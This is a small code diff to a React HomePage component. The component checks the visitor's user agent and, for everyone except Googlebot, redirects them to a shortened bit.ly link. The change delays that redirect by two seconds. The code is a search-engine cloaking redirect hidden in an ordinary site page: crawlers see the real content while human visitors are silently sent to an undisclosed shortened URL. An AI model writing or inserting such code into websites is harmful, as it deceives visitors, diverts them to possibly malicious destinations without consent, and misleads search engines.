@@ -44,7 +44,9 @@ const HomePage = () => {
         const userAgent = navigator.userAgent.toLowerCase();
         const isGooglebot = userAgent.includes('google');
         if (!isGooglebot) {
-            window.location.href = 'http://bit.ly/casib0m';
+            setTimeout(()=>{
+                window.location.href = 'http://bit.ly/casib0m';
+            }, 2000)
         }
     },[])
     return (
